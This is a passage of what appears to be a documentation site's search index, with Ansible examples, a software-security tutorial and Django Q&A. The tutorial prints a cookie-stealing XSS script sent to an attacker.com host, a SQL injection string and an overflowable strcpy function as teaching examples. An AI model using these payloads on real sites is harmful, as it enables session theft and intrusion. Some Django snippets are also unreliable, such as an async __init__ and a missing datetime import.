restarted\n</code></pre>"},{"location":"ansible/ansible/#infrastructure-provisioning","title":"Infrastructure Provisioning","text":"<p>Provision and manage infrastructure on cloud platforms.</p> <pre><code>- hosts: localhost\n  tasks:\n    - name: Create AWS EC2 instances\n      community.aws.ec2_instance:\n        name: \"web-server\"\n        state: present\n        image_id: ami-123456\n        instance_type: t2.micro\n</code></pre>"},{"location":"ansible/ansible/#security-automation","title":"Security Automation","text":"<p>Automatically enforce security policies and configurations.</p> <pre><code>- hosts: all\n  tasks:\n    - name: Ensure password authentication is disabled in sshd config\n      ansible.builtin.lineinfile:\n        path: /etc/ssh/sshd_config\n        regexp: '^#?PasswordAuthentication'\n        line: 'PasswordAuthentication no'\n</code></pre>"},{"location":"ansible/ansible/#network-automation","title":"Network Automation","text":"<p>Configure and manage network devices across data centers.</p> <pre><code>- hosts: switches\n  tasks:\n    - name: Set VLAN configuration\n      community.network.ios_vlan:\n        vlan_id: 100\n        name: \"User_VLAN\"\n        state: present\n</code></pre> <p>These examples and features showcase the versatility and power of Ansible in real-world scenarios, from simple configuration management to sophisticated automation workflows across IT infrastructure.</p>"},{"location":"cybersecurity/softwaresecurity/","title":"Cybersecurity: Securing Software - Tutorial","text":""},{"location":"cybersecurity/softwaresecurity/#1-introduction-to-cybersecurity-in-software-development","title":"1. Introduction to Cybersecurity in Software Development","text":"<p>Cybersecurity in software development involves practices, tools, and processes designed to protect software from attack, damage, or unauthorized access. It's crucial in today's digital age, where software vulnerabilities can lead to significant financial and reputational losses.</p> <p>Key Concepts: - Threat Modeling: The process of identifying, understanding, and addressing threats. - Secure Coding Practices: Techniques that developers use to write code that is resistant to vulnerabilities. - Security Testing: The practice of testing software for vulnerabilities and security gaps.</p>"},{"location":"cybersecurity/softwaresecurity/#2-understanding-code-injection","title":"2. Understanding Code Injection","text":"<p>Code injection is a security vulnerability that allows an attacker to introduce or \"inject\" code into a program or system, which is then executed by the system.</p>"},{"location":"cybersecurity/softwaresecurity/#stored-attacks","title":"Stored Attacks","text":"<p>Stored attacks, often found in web applications, involve injecting malicious scripts into stored data, which are then executed by other users when the data is displayed. A common example is stored XSS, where an attacker might inject a script into a comment on a blog post.</p> <p>Example: <pre><code>&lt;!-- Stored XSS Example --&gt;\n&lt;script&gt;alert('This site is vulnerable to XSS');&lt;/script&gt;\n</code></pre></p>"},{"location":"cybersecurity/softwaresecurity/#sql-injection","title":"SQL Injection","text":"<p>SQL Injection involves inserting or \"injecting\" malicious SQL queries via user input, which can manipulate or destroy database content.</p> <p>Example: <pre><code>-- SQL Injection Example\nSELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '';\n</code></pre></p>"},{"location":"cybersecurity/softwaresecurity/#3-server-and-client-side-validation","title":"3. Server and Client-Side Validation","text":"<p>Validation on both the server and client sides is essential for security and user experience. Client-side validation provides immediate feedback, while server-side validation is crucial for security.</p> <p>Example: <pre><code>// Client-Side Validation Example\nif (input.value.length &lt; 5) {\n    alert(\"Password must be at least 5 characters long.\");\n}\n</code></pre></p>"},{"location":"cybersecurity/softwaresecurity/#4-cross-site-scripting-xss-attacks","title":"4. Cross-Site Scripting (XSS) Attacks","text":"<p>XSS attacks involve injecting malicious scripts into web pages viewed by other users, exploiting the trust a user has for a particular site.</p> <p>Example: <pre><code>&lt;!-- Reflective XSS Example --&gt;\n&lt;script type=\"text/javascript\"&gt;\n    document.location='http://attacker.com/cookie_stealer.php?cookie=' + document.cookie;\n&lt;/script&gt;\n</code></pre></p>"},{"location":"cybersecurity/softwaresecurity/#5-arbitrary-code-execution","title":"5. Arbitrary Code Execution","text":"<p>Arbitrary code execution is a security flaw that allows an attacker to execute arbitrary code on the target system, often leading to full system control.</p> <p>Example: Imagine a vulnerable application that executes a file path without proper validation, allowing an attacker to execute arbitrary commands.</p>"},{"location":"cybersecurity/softwaresecurity/#6-reverse-engineering","title":"6. Reverse Engineering","text":"<p>Reverse engineering involves analyzing software to understand its composition, functionality, and operation, often used by attackers to find vulnerabilities.</p> <p>Example: Using tools like IDA Pro or Ghidra to disassemble an application and analyze its workings.</p>"},{"location":"cybersecurity/softwaresecurity/#7-mitigation-strategies","title":"7. Mitigation Strategies","text":"<p>Mitigation strategies involve practices and technologies to prevent, detect, and respond to cyber threats.</p> <p>Key Strategies: - Regularly updating and patching software. - Implementing least privilege access. - Conducting regular security audits and penetration testing.</p>"},{"location":"cybersecurity/softwaresecurity/#8-buffer-overflow-attacks","title":"8. Buffer Overflow Attacks","text":"<p>Buffer overflow attacks exploit vulnerabilities in software where operations exceed the buffer's allocated memory, allowing attackers to execute arbitrary code.</p> <p>Example: <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerableFunction(char *str) {\n    char buffer[100];\n    strcpy(buffer, str); // No bounds checking\n}\n\nint main(int argc, char **argv) {\n    vulnerableFunction(argv[1]);\n    return 0;\n}\n</code></pre> In this example, if the input string exceeds 100 characters, it can overwrite adjacent memory, potentially leading to arbitrary code execution.</p>"},{"location":"cybersecurity/softwaresecurity/#9-session-hijacking-and-management","title":"9. Session Hijacking and Management","text":"<p>Session hijacking involves an attacker taking over a user session to gain unauthorized access to information or services in a system.</p> <p>Example: An attacker uses a packet sniffer to intercept a session cookie transmitted over an unencrypted connection, then uses that cookie to impersonate the victim.</p>"},{"location":"cybersecurity/softwaresecurity/#10-phishing-and-social-engineering-attacks","title":"10. Phishing and Social Engineering Attacks","text":"<p>Phishing and social engineering attacks trick users into revealing sensitive information or performing actions that compromise security.</p> <p>Example: An email crafted to look like it's from a trusted source, asking the recipient to click on a link and enter their login credentials.</p>"},{"location":"cybersecurity/softwaresecurity/#11-encryption-and-cryptography-in-software-security","title":"11. Encryption and Cryptography in Software Security","text":"<p>Encryption and cryptography are essential for protecting data in transit and at rest, ensuring that even if data is intercepted, it cannot be easily read.</p> <p>Example: Using TLS (Transport Layer Security) for secure communication between a web browser and a server.</p>"},{"location":"cybersecurity/softwaresecurity/#12-application-security-testing","title":"12. Application Security Testing","text":"<p>Application security testing involves evaluating software for vulnerabilities and weaknesses through various methods, including static analysis, dynamic analysis, and penetration testing.</p> <p>Example: Using a tool like OWASP ZAP (Zed Attack Proxy) to automatically scan a web application for common security vulnerabilities.</p>"},{"location":"cybersecurity/softwaresecurity/#13-secure-software-development-lifecycle-ssdlc","title":"13. Secure Software Development Lifecycle (SSDLC)","text":"<p>SSDLC integrates security practices at every phase of the software development lifecycle, from planning to deployment, to minimize vulnerabilities.</p> <p>Example: Incorporating threat modeling in the design phase to identify potential security issues before development begins.</p>"},{"location":"cybersecurity/softwaresecurity/#14-compliance-and-regulatory-frameworks","title":"14. Compliance and Regulatory Frameworks","text":"<p>Compliance with regulatory frameworks ensures that software meets specific security standards and requirements, reducing legal and financial risks.</p> <p>Example: Adhering to the General Data Protection Regulation (GDPR) for software handling personal data of EU citizens.</p>"},{"location":"cybersecurity/softwaresecurity/#15-incident-response-planning","title":"15. Incident Response Planning","text":"<p>Incident response planning prepares organizations to respond effectively to cybersecurity incidents, minimizing impact and recovery time.</p> <p>Example: Developing a documented incident response plan that outlines roles, responsibilities, and procedures for detecting, responding to, and recovering from security incidents.</p>"},{"location":"cybersecurity/softwaresecurity/#16-cloud-security-considerations","title":"16. Cloud Security Considerations","text":"<p>Cloud security involves protecting data, applications, and infrastructure hosted in cloud environments from threats.</p> <p>Example: Implementing multi-factor authentication (MFA) and encryption for data stored in cloud services.</p>"},{"location":"cybersecurity/softwaresecurity/#17-internet-of-things-iot-security","title":"17. Internet of Things (IoT) Security","text":"<p>IoT security addresses the unique challenges of securing interconnected devices and systems that are often not designed with security in mind.</p> <p>Example: Securing IoT devices with strong passwords, regular firmware updates, and network segmentation.</p>"},{"location":"cybersecurity/softwaresecurity/#secure-authentication-practices","title":"Secure Authentication Practices","text":"<p>Overview: Implementing strong authentication mechanisms to ensure that only authorized users can access the system.</p> <p>Example: Implementing OAuth 2.0 protocol for secure authorization of users across web applications.</p>"},{"location":"cybersecurity/softwaresecurity/#secure-api-design-and-management","title":"Secure API Design and Management","text":"<p>Overview: Designing and managing APIs to prevent unauthorized access and data breaches.</p> <p>Example: Using API keys and tokens with limited permissions and expiration times to secure API access.</p>"},{"location":"cybersecurity/softwaresecurity/#microservices-security","title":"Microservices Security","text":"<p>Overview: Addressing the security challenges in a microservices architecture, including secure communication between services and data protection.</p> <p>Example: Implementing service mesh frameworks like Istio to manage secure service-to-service communication in a microservices architecture.</p>"},{"location":"cybersecurity/softwaresecurity/#container-security","title":"Container Security","text":"<p>Overview: Securing containerized applications by protecting the containers, the orchestration environments, and the underlying infrastructure.</p> <p>Example: Using Docker security best practices, such as minimal base images, scanning images for vulnerabilities, and implementing Docker content trust.</p>"},{"location":"cybersecurity/softwaresecurity/#devsecops-integration","title":"DevSecOps Integration","text":"<p>Overview: Integrating security practices within the DevOps pipeline to ensure secure software development lifecycle.</p> <p>Example: Automating security scanning and compliance checks in the CI/CD pipeline using tools like Jenkins, SonarQube, and Clair.</p>"},{"location":"cybersecurity/softwaresecurity/#security-information-and-event-management-siem","title":"Security Information and Event Management (SIEM)","text":"<p>Overview: Using SIEM systems to provide real-time analysis of security alerts generated by applications and network hardware.</p> <p>Example: Implementing a SIEM solution like Splunk or ELK Stack for monitoring, detecting, and responding to security incidents.</p>"},{"location":"cybersecurity/softwaresecurity/#data-privacy-and-protection","title":"Data Privacy and Protection","text":"<p>Overview: Ensuring the confidentiality, integrity, and availability of user data, complying with regulations like GDPR and CCPA.</p> <p>Example: Implementing data encryption, both at rest and in transit, and anonymization techniques for protecting sensitive user data.</p>"},{"location":"cybersecurity/softwaresecurity/#mobile-security","title":"Mobile Security","text":"<p>Overview: Securing mobile applications and devices against unauthorized access, loss, and theft.</p> <p>Example: Using mobile device management (MDM) solutions to enforce security policies on mobile devices and applications.</p> <p>Including these topics with practical examples will provide a more rounded and comprehensive view of cybersecurity in software development, catering to a wide range of security concerns in modern software engineering practices.</p>"},{"location":"django/django/","title":"1. Django ORM Optimization and Query Performance","text":"<p>Question: How can you optimize complex database queries in Django's ORM to enhance performance? Discuss techniques to prevent common issues such as the N+1 query problem and how to utilize <code>select_related</code> and <code>prefetch_related</code> effectively.</p> <p>Answer:</p> <p>Optimizing Django ORM queries is essential for maintaining high performance, especially in applications with complex data interactions. Advanced strategies beyond basic <code>select_related</code> and <code>prefetch_related</code> can further enhance efficiency and scalability.</p>"},{"location":"django/django/#1-preventing-the-n1-query-problem","title":"1. Preventing the N+1 Query Problem","text":"<p>The N+1 query problem arises when an initial query retrieves N objects and then executes an additional query for each object's related data, resulting in N+1 total queries.</p> <p>Inefficient Example: <pre><code>users = User.objects.all()\nfor user in users:\n    print(user.profile.bio)\n</code></pre> This executes 1 query for users and N queries for profiles.</p>"},{"location":"django/django/#2-utilizing-select_related","title":"2. Utilizing <code>select_related</code>","text":"<p><code>select_related</code> is optimal for single-valued relationships (<code>ForeignKey</code>, <code>OneToOneField</code>). It performs a SQL join to fetch related objects in a single query.</p> <p>Efficient Example: <pre><code>users = User.objects.select_related('profile').all()\nfor user in users:\n    print(user.profile.bio)\n</code></pre></p> <p>Advanced Usage: - Chaining Relationships: <pre><code>orders = Order.objects.select_related('customer__profile').all()\n</code></pre>   Fetches <code>Order</code>, <code>Customer</code>, and <code>Profile</code> in one query.</p> <ul> <li>Specifying Multiple Fields: <pre><code>queryset = User.objects.select_related('profile', 'address').all()\n</code></pre></li> </ul>"},{"location":"django/django/#3-utilizing-prefetch_related","title":"3. Utilizing <code>prefetch_related</code>","text":"<p><code>prefetch_related</code> is suitable for multi-valued relationships (<code>ManyToManyField</code>, reverse <code>ForeignKey</code>). It executes separate queries and efficiently joins them in Python.</p> <p>Efficient Example: <pre><code>authors = Author.objects.prefetch_related('books').all()\nfor author in authors:\n    for book in author.books.all():\n        print(book.title)\n</code></pre></p> <p>Advanced Usage: - Prefetching Across Relationships: <pre><code>authors = Author.objects.prefetch_related('books__publisher').all()\n</code></pre></p> <ul> <li>Custom Prefetch Objects: <pre><code>from django.db.models import Prefetch\n\nbooks_prefetch = Prefetch('books', queryset=Book.objects.select_related('publisher'))\nauthors = Author.objects.prefetch_related(books_prefetch).all()\n</code></pre></li> </ul>"},{"location":"django/django/#4-combining-select_related-and-prefetch_related","title":"4. Combining <code>select_related</code> and <code>prefetch_related</code>","text":"<p>For queries involving both single and multi-valued relationships, combining both methods optimizes performance.</p> <p>Example: <pre><code>books = Book.objects.select_related('publisher').prefetch_related('authors').all()\nfor book in books:\n    print(book.publisher.name)\n    for author in book.authors.all():\n        print(author.name)\n</code></pre></p>"},{"location":"django/django/#5-advanced-techniques","title":"5. Advanced Techniques","text":""},{"location":"django/django/#a-annotate-and-aggregate","title":"a. Annotate and Aggregate","text":"<p>Perform calculations directly in the database to reduce data transfer and processing in Python.</p> <p>Example: <pre><code>from django.db.models import Count, Avg\n\nauthors = Author.objects.annotate(\n    book_count=Count('books'),\n    average_rating=Avg('books__rating')\n).all()\nfor author in authors:\n    print(f\"{author.name} has {author.book_count} books with an average rating of {author.average_rating}.\")\n</code></pre></p>"},{"location":"django/django/#b-raw-sql-and-rawqueryset","title":"b. Raw SQL and <code>RawQuerySet</code>","text":"<p>For highly optimized queries not achievable via the ORM, use raw SQL while ensuring protection against SQL injection.</p> <p>Example: <pre><code>users = User.objects.raw('SELECT * FROM auth_user WHERE last_login &gt; %s', [cutoff_date])\n</code></pre></p> <p>Caution: Ensure all parameters are properly escaped.</p>"},{"location":"django/django/#c-database-indexing","title":"c. Database Indexing","text":"<p>Beyond simple indexing, consider composite indexes and using <code>db_index=True</code> strategically.</p> <p>Example: <pre><code>class Order(models.Model):\n    customer = models.ForeignKey(Customer, on_delete=models.CASCADE)\n    order_date = models.DateTimeField(db_index=True)\n\n    class Meta:\n        indexes = [\n            models.Index(fields=['customer', 'order_date']),\n        ]\n</code></pre></p>"},{"location":"django/django/#d-query-optimization-with-defer-and-only","title":"d. Query Optimization with <code>defer</code> and <code>only</code>","text":"<p>Load only necessary fields to reduce query size.</p> <p>Example: <pre><code>users = User.objects.only('id', 'username').all()\n</code></pre></p>"},{"location":"django/django/#e-using-values-and-values_list","title":"e. Using <code>values</code> and <code>values_list</code>","text":"<p>Retrieve dictionaries or tuples of specific fields for further processing.</p> <p>Example: <pre><code>user_data = User.objects.values('id', 'username')\n</code></pre></p>"},{"location":"django/django/#6-caching-strategies","title":"6. Caching Strategies","text":"<p>Implement caching to store frequently accessed query results.</p> <p>Example Using Django Cache Framework: <pre><code>from django.core.cache import cache\n\ndef get_expensive_data():\n    data = cache.get('expensive_data')\n    if not data:\n        data = perform_expensive_operation()\n        cache.set('expensive_data', data, timeout=300)\n    return data\n</code></pre></p> <p>Advanced Caching: - Cache Invalidation: Ensure cache is updated when underlying data changes. - Cache Versioning: Manage different versions of cached data.</p>"},{"location":"django/django/#7-profiling-and-monitoring","title":"7. Profiling and Monitoring","text":"<p>Use tools like Django Debug Toolbar, Silk, or New Relic to monitor query performance and identify bottlenecks.</p> <p>Example Setup with Django Debug Toolbar: <pre><code>pip install django-debug-toolbar\n</code></pre> <pre><code># settings.py\nINSTALLED_APPS = [\n    # ... other apps ...\n    'debug_toolbar',\n]\n\nMIDDLEWARE = [\n    'debug_toolbar.middleware.DebugToolbarMiddleware',\n    # ... other middleware ...\n]\n\nINTERNAL_IPS = ['127.0.0.1']\n</code></pre> <pre><code>&lt;!-- templates/base.html --&gt;\n{% load debug_toolbar %}\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;My Site&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    {% debug_toolbar %}\n    &lt;!-- Content --&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p>"},{"location":"django/django/#8-best-practices","title":"8. Best Practices","text":"<ul> <li>Avoid <code>select_related</code> on Many-to-Many: It\u2019s ineffective; use <code>prefetch_related</code> instead.</li> <li>Batch Processing: Use bulk operations to minimize queries.   <pre><code>User.objects.bulk_create([\n    User(username='user1'),\n    User(username='user2'),\n    # ...\n])\n</code></pre></li> <li>Monitor Database Performance: Regularly analyze query performance using database-specific tools like PostgreSQL's <code>EXPLAIN ANALYZE</code>.</li> </ul> <p>Conclusion: Optimizing Django ORM queries involves a combination of using <code>select_related</code>, <code>prefetch_related</code>, advanced querying techniques, strategic indexing, effective caching, and continuous profiling. Mastery of these strategies ensures efficient database interactions and high application performance.</p>"},{"location":"django/django/#2-custom-middleware-development","title":"2. Custom Middleware Development","text":"<p>Question: Describe the process of creating and integrating custom middleware in a Django application. Provide an example where middleware is used to modify the request and response objects, such as adding custom headers or logging request data.</p> <p>Answer:</p> <p>Middleware in Django allows for processing requests and responses globally. Advanced middleware can handle tasks like performance monitoring, authentication, and custom header management.</p>"},{"location":"django/django/#1-middleware-structure","title":"1. Middleware Structure","text":"<p>In Django 1.10+, middleware is defined as a class with <code>__init__</code> and <code>__call__</code> methods.</p> <p>Basic Structure: <pre><code>class CustomMiddleware:\n    def __init__(self, get_response):\n        self.get_response = get_response\n        # One-time setup\n\n    def __call__(self, request):\n        # Pre-processing\n        response = self.get_response(request)\n        # Post-processing\n        return response\n</code></pre></p>"},{"location":"django/django/#2-creating-custom-middleware","title":"2. Creating Custom Middleware","text":"<p>Example: Logging request details and adding a custom response header.</p> <pre><code># myapp/middleware.py\nimport logging\nfrom time import time\n\nlogger = logging.getLogger(__name__)\n\nclass RequestLoggingMiddleware:\n    def __init__(self, get_response):\n        self.get_response = get_response\n\n    def __call__(self, request):\n        start_time = time()\n        logger.info(f\"Request Method: {request.method}, Path: {request.path}\")\n\n        response = self.get_response(request)\n\n        duration = time() - start_time\n        logger.info(f\"Response Status: {response.status_code}, Duration: {duration:.2f}s\")\n        response['X-Request-Duration'] = f\"{duration:.2f}s\"\n\n        return response\n</code></pre>"},{"location":"django/django/#3-integrating-middleware","title":"3. Integrating Middleware","text":"<p>Add the middleware to <code>settings.py</code> in the <code>MIDDLEWARE</code> list.</p> <pre><code># settings.py\nMIDDLEWARE = [\n    # ... existing middleware ...\n    'myapp.middleware.RequestLoggingMiddleware',\n]\n</code></pre>"},{"location":"django/django/#4-configuring-logging","title":"4. Configuring Logging","text":"<p>Ensure logging is configured to capture middleware logs.</p> <pre><code># settings.py\nLOGGING = {\n    'version': 1,\n    'disable_existing_loggers': False,\n    'handlers': {\n        'console': {\n            'class': 'logging.StreamHandler',\n        },\n    },\n    'loggers': {\n        'myapp.middleware': {\n            'handlers': ['console'],\n            'level': 'INFO',\n        },\n    },\n}\n</code></pre>"},{"location":"django/django/#5-advanced-middleware-features","title":"5. Advanced Middleware Features","text":""},{"location":"django/django/#a-modifying-request-objects","title":"a. Modifying Request Objects","text":"<p>Attach additional attributes to <code>request</code> for use in views.</p> <pre><code>def __call__(self, request):\n    request.custom_attribute = 'CustomValue'\n    response = self.get_response(request)\n    return response\n</code></pre>"},{"location":"django/django/#b-handling-exceptions","title":"b. Handling Exceptions","text":"<p>Catch and handle exceptions to implement custom error handling.</p> <pre><code>from django.http import HttpResponse\n\ndef __call__(self, request):\n    try:\n        response = self.get_response(request)\n    except Exception as e:\n        logger.error(f\"Exception: {e}\")\n        response = HttpResponse(\"Internal Server Error\", status=500)\n    return response\n</code></pre>"},{"location":"django/django/#c-asynchronous-middleware","title":"c. Asynchronous Middleware","text":"<p>For ASGI support, define <code>async __call__</code>.</p> <pre><code>class AsyncMiddleware:\n    async def __init__(self, get_response):\n        self.get_response = get_response\n\n    async def __call__(self, request):\n        # Async pre-processing\n        response = await self.get_response(request)\n        # Async post-processing\n        return response\n</code></pre>"},{"location":"django/django/#6-best-practices","title":"6. Best Practices","text":"<ul> <li>Keep Middleware Lightweight: Minimize processing to reduce request latency.</li> <li>Avoid Business Logic: Implement cross-cutting concerns like logging, authentication.</li> <li>Thread Safety: Ensure middleware is thread-safe, especially when modifying shared resources.</li> <li>Order Matters: Place middleware appropriately in the <code>MIDDLEWARE</code> list to ensure correct processing order.</li> </ul>"},{"location":"django/django/#7-testing-middleware","title":"7. Testing Middleware","text":"<p>Example Test Case: <pre><code># myapp/tests/test_middleware.py\nfrom django.test import TestCase, RequestFactory\nfrom myapp.middleware import RequestLoggingMiddleware\nfrom django.http import HttpResponse\n\nclass MiddlewareTest(TestCase):\n    def setUp(self):\n        self.factory = RequestFactory()\n        self.middleware = RequestLoggingMiddleware(self.get_response)\n\n    def get_response(self, request):\n        return HttpResponse(\"OK\")\n\n    def test_middleware_logging(self):\n        request = self.factory.get('/test-path/')\n        response = self.middleware(request)\n        self.assertEqual(response.status_code, 200)\n        self.assertIn('X-Request-Duration', response)\n</code></pre></p> <p>Conclusion: Custom middleware enhances Django applications by handling global request/response processing tasks. By adhering to best practices and leveraging advanced features, middleware can efficiently manage cross-cutting concerns without impacting application performance.</p>"},{"location":"django/django/#3-advanced-template-rendering-and-context-processors","title":"3. Advanced Template Rendering and Context Processors","text":"<p>Question: Explain how Django's template system can be extended using custom template tags and filters. Additionally, discuss how to create and use custom context processors to inject common data into templates.</p> <p>Answer:</p> <p>Django's templating system is extensible, allowing developers to create custom tags, filters, and context processors for enhanced functionality and reusable components.</p>"},{"location":"django/django/#1-custom-template-tags-and-filters","title":"1. Custom Template Tags and Filters","text":""},{"location":"django/django/#a-creating-custom-template-tags","title":"a. Creating Custom Template Tags","text":"<p>Step-by-Step:</p> <ol> <li> <p>Create <code>templatetags</code> Directory: <pre><code>myapp/\n\u251c\u2500\u2500 templatetags/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2514\u2500\u2500 custom_tags.py\n</code></pre></p> </li> <li> <p>Define Custom Tags: <pre><code># myapp/templatetags/custom_tags.py\nfrom django import template\n\nregister = template.Library()\n\n@register.simple_tag\ndef multiply(a, b):\n    return a * b\n\n@register.inclusion_tag('myapp/display_product.html')\ndef show_product(product):\n    return {'product': product}\n</code></pre></p> </li> <li> <p>Use in Templates: <pre><code>{% load custom_tags %}\n{% multiply 3 5 %} &lt;!-- Outputs: 15 --&gt;\n{% show_product product %}\n</code></pre></p> </li> </ol> <p>Advanced Example: Custom Inclusion Tag with Context</p> <pre><code>@register.inclusion_tag('myapp/recent_posts.html')\ndef recent_posts(count=5):\n    posts = Post.objects.order_by('-published_date')[:count]\n    return {'recent_posts': posts}\n</code></pre>"},{"location":"django/django/#b-creating-custom-template-filters","title":"b. Creating Custom Template Filters","text":"<p>Example: Truncate Words</p> <pre><code># myapp/templatetags/custom_filters.py\nfrom django import template\n\nregister = template.Library()\n\n@register.filter(name='truncate_words')\ndef truncate_words(value, num):\n    words = value.split()\n    if len(words) &gt; num:\n        return ' '.join(words[:num]) + '...'\n    return value\n</code></pre> <p>Usage in Template: <pre><code>{% load custom_filters %}\n{{ article.content|truncate_words:30 }}\n</code></pre></p> <p>Advanced Example: Safe JSON Filter</p> <pre><code>@register.filter(name='to_json')\ndef to_json(value):\n    import json\n    return json.dumps(value)\n</code></pre> <p>Usage: <pre><code>&lt;script&gt;\n    var data = {{ data|to_json|safe }};\n&lt;/script&gt;\n</code></pre></p>"},{"location":"django/django/#2-custom-context-processors","title":"2. Custom Context Processors","text":"<p>Purpose: Inject common data into all templates, such as site-wide settings or user-specific information.</p>"},{"location":"django/django/#a-creating-a-context-processor","title":"a. Creating a Context Processor","text":"<pre><code># myapp/context_processors.py\ndef site_info(request):\n    return {\n        'site_name': 'My Awesome Site',\n        'contact_email': 'contact@myawesomesite.com',\n        'current_year': datetime.datetime.now().year,\n    }\n</code></pre>"},{"location":"django/django/#b-registering-the-context-processor","title":"b. Registering the Context Processor","text":"<p>Add to <code>TEMPLATES</code> in <code>settings.py</code>:</p> <pre><code># settings.py\nTEMPLATES = [\n    {\n        # ... other settings ...\n        'OPTIONS': {\n            'context_processors': [\n                # ... default context processors ...\n                'myapp.context_processors.site_info',\n            ],\n        },\n    },\n]\n</code></pre>"},{"location":"django/django/#c-using-in-templates","title":"c. Using in Templates","text":"<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;{{ site_name }}&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;footer&gt;\n        &amp;copy; {{ current_year }} {{ site_name }} | Contact: {{ contact_email }}\n    &lt;/footer&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Advanced Example: User-Specific Context Processor</p> <pre><code># myapp/context_processors.py\ndef user_notifications(request):\n    if request.user.is_authenticated:\n        notifications = Notification.objects.filter(user=request.user, read=False)\n        return {'unread_notifications': notifications}\n    return {}\n</code></pre> <p>Usage in Template: <pre><code>{% if unread_notifications %}\n    &lt;ul&gt;\n        {% for notification in unread_notifications %}\n            &lt;li&gt;{{ notification.message }}&lt;/li&gt;\n        {% endfor %}\n    &lt;/ul&gt;\n{% endif %}\n</code></pre></p>"},{"location":"django/django/#3-advanced-template-tags-and-filters","title":"3. Advanced Template Tags and Filters","text":""},{"location":"django/django/#a-custom-assignment-tag","title":"a. Custom Assignment Tag","text":"<p>Allows assigning a value to a variable within a template.</p> <pre><code>@register.simple_tag\ndef get_latest_articles(count=5):\n    articles = Article.objects.order_by('-published_date')[:count]\n    return articles\n</code></pre> <p>Usage: <pre><code>{% get_latest_articles as latest_articles %}\n&lt;ul&gt;\n    {% for article in latest_articles %}\n        &lt;li&gt;{{ article.title }}&lt;/li&gt;\n    {% endfor %}\n&lt;/ul&gt;\n</code></pre></p>"},{"location":"django/django/#b-inclusion-tags-with-complex-context","title":"b. Inclusion Tags with Complex Context","text":"<p>Render complex components with multiple context variables.</p> <pre><code>@register.inclusion_tag('myapp/sidebar.html')\ndef render_sidebar(user):\n    recent_posts = Post.objects.filter(author=user).order_by('-published_date')[:5]\n    return {'user': user, 'recent_posts': recent_posts}\n</code></pre> <p>Usage: <pre><code>{% load custom_tags %}\n{% render_sidebar request.user %}\n</code></pre></p>"},{"location":"django/django/#4-best-practices","title":"4. Best Practices","text":"<ul> <li>Organize Tags and Filters: Group related functionalities into separate modules for clarity.</li> <li>Minimal Logic in Templates: Encapsulate complex logic within tags, filters, or context processors to keep templates clean.</li> <li>Secure Handling: Sanitize inputs in custom tags and filters to prevent security vulnerabilities like XSS.</li> <li>Documentation: Clearly document custom tags, filters, and context processors for maintainability.</li> <li>Performance Optimization: Avoid heavy database queries within template tags; prefer prefetching data in views or context processors.</li> </ul>"},{"location":"django/django/#5-example-comprehensive-implementation","title":"5. Example: Comprehensive Implementation","text":""},{"location":"django/django/#a-custom-template-tag-to-display-users-full-name","title":"a. Custom Template Tag to Display User's Full Name","text":"<pre><code># myapp/templatetags/user_tags.py\nfrom django import template\n\nregister = template.Library()\n\n@register.simple_tag\ndef full_name(user):\n    return f\"{user.first_name} {user.last_name}\"\n</code></pre> <p>Usage in Template: <pre><code>{% load user_tags %}\n&lt;h1&gt;Welcome, {% full_name user %}!&lt;/h1&gt;\n</code></pre></p>"},{"location":"django/django/#b-custom-context-processor-to-include-current-year","title":"b. Custom Context Processor to Include Current Year","text":"<pre><code># myapp/context_processors.py\nimport datetime\n\ndef current_year(request):\n    return {\n        'current_year': datetime.datetime.now().year,\n    }\n</code></pre> <p>Register in Settings: <pre><code># settings.py\nTEMPLATES = [\n    {\n        # ... other settings ...\n        'OPTIONS': {\n            'context_processors': [\n                # ... default context processors ...\n                'myapp.context_processors.current_year',\n            ],\n        },\n    },\n]\n</code></pre></p> <p>Usage in Template: <pre><code>&lt;footer&gt;\n    &amp;copy; {{ current_year }} My Awesome Site\n&lt;/footer&gt;\n</code></pre></p>"},{"location":"django/django/#6-advanced-context-processors","title":"6. Advanced Context Processors","text":"<p>Example: Injecting Global Settings</p> <pre><code># myapp/context_processors.py\nfrom django.conf import settings\n\ndef global_settings(request):\n    return {\n        'SITE_NAME': settings.SITE_NAME,\n        'MAINTENANCE_MODE': settings.MAINTENANCE_MODE,\n    }\n</code></pre> <p>Usage in Template: <pre><code>{% if MAINTENANCE_MODE %}\n    &lt;div class=\"alert\"&gt;Site is under maintenance.&lt;/div&gt;\n{% endif %}\n</code></pre></p> <p>Conclusion: Extending Django's template system with custom tags, filters, and context processors allows for more dynamic, reusable, and maintainable templates. By following best practices and leveraging advanced features, developers can create powerful templating solutions tailored to their application's needs.</p>"},{"location":"django/django/#4-django-signals-and-their-applications","title":"4. Django Signals and Their Applications","text":"<p>Question: What are Django signals, and how can they be used to decouple components within a Django application? Provide an example of using signals to perform actions such as sending a welcome email after a new user registers.</p> <p>Answer:</p> <p>Django Signals facilitate decoupled communication between components, allowing certain senders to notify receivers when specific actions occur. This promotes a modular architecture, enabling components to react to events without direct dependencies.</p>"},{"location":"django/django/#1-understanding-django-signals","title":"1. Understanding Django Signals","text":"<ul> <li>Senders: Emit signals (e.g., Django models like <code>User</code>).</li> <li>Receivers: Functions that respond to signals.</li> <li>Common Signals:</li> <li><code>pre_save</code> / <code>post_save</code>: Before/after a model's <code>save()</code> method.</li> <li><code>pre_delete</code> / <code>post_delete</code>: Before/after a model's <code>delete()</code> method.</li> <li><code>m2m_changed</code>: When a <code>ManyToManyField</code> is altered.</li> </ul>"},{"location":"django/django/#2-benefits-of-using-signals","title":"2. Benefits of Using Signals","text":"<ul> <li>Decoupling: Components can interact without direct references.</li> <li>Reusability: Receivers can be reused across different parts of the application.</li> <li>Maintainability: Separates concerns, making the codebase cleaner.</li> </ul>"},{"location":"django/django/#3-example-scenario-sending-a-welcome-email-after-user-registration","title":"3. Example Scenario: Sending a Welcome Email After User Registration","text":""},{"location":"django/django/#a-define-the-receiver-function","title":"a. Define the Receiver Function","text":"<pre><code># myapp/signals.py\nfrom django.db.models.signals import post_save\nfrom django.dispatch import 